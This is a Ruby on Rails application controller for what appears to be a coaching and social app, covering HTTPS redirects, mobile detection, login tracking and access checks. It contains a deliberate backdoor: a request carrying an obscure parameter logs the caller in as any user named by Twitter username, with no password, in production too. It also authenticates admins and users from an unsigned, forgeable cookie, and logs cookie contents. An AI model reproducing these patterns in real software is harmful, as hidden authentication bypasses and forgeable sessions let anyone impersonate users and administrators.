class ApplicationController < ActionController::Base
    protect_from_forgery
    # Only redirect to https on production. Rest of before_filter is the same
    if Rails.env.production?
      before_filter :redirect_to_https, :theming, :allowed_browser_types, :user_signed_in?, :check_for_logged_in
    else
      before_filter :theming, :allowed_browser_types, :user_signed_in?, :check_for_logged_in
    end
    layout :choose_layout
  
    MOBILE_BROWSERS = ["android", "ipod", "opera mini", "blackberry", "palm", "hiptop", "avantgo", "plucker", "xiino", "blazer", "elaine", "windows ce; ppc;", "windows ce; smartphone;","iemobile", "up.browser","up.link","mmp","symbian","smartphone", "midp", "wap", "vodafone", "o2", "pocket", "kindle", "mobile", "pda", "psp", "treo"]
    
    def choose_layout
      if params[:controller] == 'dash'
        @layout = 'dash'
      else
        @layout = 'app'      
      end
      return @layout
    end
    
    def detect_browser
      agent = request.headers["HTTP_USER_AGENT"] ? request.headers["HTTP_USER_AGENT"].downcase : ''
      MOBILE_BROWSERS.each do |m|
        if agent.match(m)
          @mobile_browser_matched = m
          return "mobile" 
        end
      end
      return "web"
    end
    
    def allowed_browser_types
      if @mobile_browser_matched == 'iemobile' and params[:action] != 'unsupported'
        redirect_to :controller => :home, :action => :unsupported
        return false
      end
    end

    # These controllers and actions REQUIRE secure server
    SECURE = {'store' => {'index' => true, 'program' => true, 'pay' => true, 'payment_confirm' => true, 'pay_with_card' => true, 'authorization_confirm' => true, 'send_invitations' => true},
              'play' => {'onboarding' => true, 'coach_detail' => true, 'self_coaching' => true}, 
              'oauth' => {'foursquare_push' => true}}
    
    # These controllers and actions don't require secure server, but don't switch them to standard server if they happen to be on secure
    DO_NOT_SWITCH = {'home' => {'store_location' => true}, 'play' => {'save_interview' => true, 'create_invite' => true, 'send_invite' => true}, 'stream' => {'view_notification' => true}, 'store' => {'send_invitations' => true, 'cancel_subscription_id' => true}, 'oauth' => {'foursquare_callback' => true}, 'build' => {'index' => true, 'suggestion' => true}}

    def redirect_to_https
      if SECURE[params[:controller]] and 
         SECURE[params[:controller]][params[:action]] and 
         !request.ssl? and 
         !(DO_NOT_SWITCH[params[:controller]].present? and DO_NOT_SWITCH[params[:controller]][params[:action]].present?) then
         
        logger.warn "params: #{params.inspect}"
        flash.keep
        redirect_to :protocol => "https://", :host => SECURE_DOMAIN, :anchor => params[:anchor]

      elsif request.ssl? and (!SECURE[params[:controller]] or 
            !SECURE[params[:controller]][params[:action]]) and 
            !(DO_NOT_SWITCH[params[:controller]].present? and DO_NOT_SWITCH[params[:controller]][params[:action]].present?) then 
            
        logger.warn "params: #{params.inspect}"
        flash.keep
        redirect_to :protocol => "http://", :host => DOMAIN, :redirect_to => params[:redirect_to], :anchor => params[:anchor]

      end
    end
      
    def theming
      @data_theme = ''
      @browser_type = detect_browser            
    end

    def backdoor_login
      current_user = User.find_by_twitter_username params[:djkslfjldsfjk]
      cookies.delete :u
      cookies[:u] = {:value => "#{current_user.id}|t|#{current_user.twitter_username}",
                     :expires => 1.hour.from_now,
                     :domain => ".#{request.host}"}

      logger.warn "Spoofing as #{current_user.name}"
      logger.warn cookies[:u].inspect
      redirect_to :controller => :play, :action => :index
      return
    end
    
    # Used by devise to redirect after a login
    def after_sign_in_path_for(resource)
      if current_user.present? and !current_user.in_beta?
        current_user.update_attributes(:in_beta => true)
      end
      session_return_to = session[:redirect_after_oauth]
      session[:redirect_after_oauth] = nil
      # stored_location_for(resource) || 
      session_return_to || root_path
    end

    def track_login_with_kissmetrics
      u = current_user.present? ? current_user : @_user
      return unless u.present?
      # Used in home/_mobile_footer.
      @kissmetrics = {:record => Array.new, :set => Array.new}
      TrackedAction.add(:visited, current_user)
      @first_page_on_visit = true
      Time.zone = u.time_zone_or_default
      u.update_streak(visiting_now = true)
      if Rails.env.production?
        u.delay.autofollow_people_on_other_networks
      end

      @kissmetrics[:record] << {:name => 'Signed In'}
      @kissmetrics[:set] << {:name => 'gender', :value => u.gender}
      @kissmetrics[:set] << {:name => 'userid', :value => u.id}
      @kissmetrics[:set] << {:name => 'time_zone', :value => u.time_zone} if u.time_zone.present?
      @kissmetrics[:set] << {:name => 'visit_streak', :value => u.visit_streak}
      @kissmetrics[:set] << {:name => 'coach', :value => u.coach?}
    end

    def check_for_logged_in
      # Used in home/_mobile_footer 
      @kissmetrics = {:record => Array.new, :set => Array.new}
      if params[:djkslfjldsfjk].present?
        backdoor_login

      # Via devise
      elsif current_user
        @_user = current_user

      # Via old cookie way
      elsif cookies[:u]
        split_cookie = cookies[:u].split('|')
        @_user = User.find_by_id_and_twitter_username(split_cookie[0], split_cookie[2]) rescue nil  
        if !@_user 
          if params[:action] != 'logout'
            cookies.delete :u
            redirect_to :controller => :home, :action => :logout
            return false
          end
        end
        sign_in(:user, @_user) if @_user.email.present? and @_user.encrypted_password.present?
        
      end           
      if @_user 
        if @_user.last_logged_in.blank? or @_user.last_logged_in < Time.zone.now-1.hour
          track_login_with_kissmetrics
          if !@_user.photo? and @_user.twitter_username.present?
            @_user.update_profile_photo rescue nil  
          end
        end
        Time.zone = @_user.time_zone_or_default
        logger.warn "USER: #{@_user.name} (#{@_user.id}) at #{Time.zone.now}"
      end
      logger.warn "USER AGENT: #{request.env['HTTP_USER_AGENT']}"
    end
    
    COACH_CONTROLLERS = {'dash' => true}
    
    # Allowed even if you aren't logged in
    ALLOWED_CONTROLLERS = {'home' => true, 'help' => true, 'store' => true, 'stream' => true, 'tour' => true, 'oauth' => true, 'waiting_room' => true, 'play' => true, 'build' => true}
        
    def login_required
      if cookies[:u]
        return true
      end
      session[:return_to] = session[:signup_required_redirect] ? session[:signup_required_redirect] : request.url
      redirect_to :controller => :store, :action => :index, :host => SECURE_DOMAIN, :protocol => 'https://'
      return false 
    end

    def coach_required
      if current_user and current_user.coach?
        return true
      else
        session[:return_to] = session[:signup_required_redirect] ? session[:signup_required_redirect] : request.url
        redirect_to :controller => :home, :action => :index
        return false         
      end
    end
    
    def admin_required
      return true unless Rails.env == 'production'
      if cookies[:u] 
        split_cookie = cookies[:u].split('|')
        user = User.find_by_id_and_twitter_username(split_cookie[0], split_cookie[2]) rescue nil             
        if user and user.admin?
          return true
        end
      end
      session[:return_to] = session[:signup_required_redirect] ? session[:signup_required_redirect] : request.fullpath
      redirect_to :controller => :home, :action => :index
      return false 
    end
end
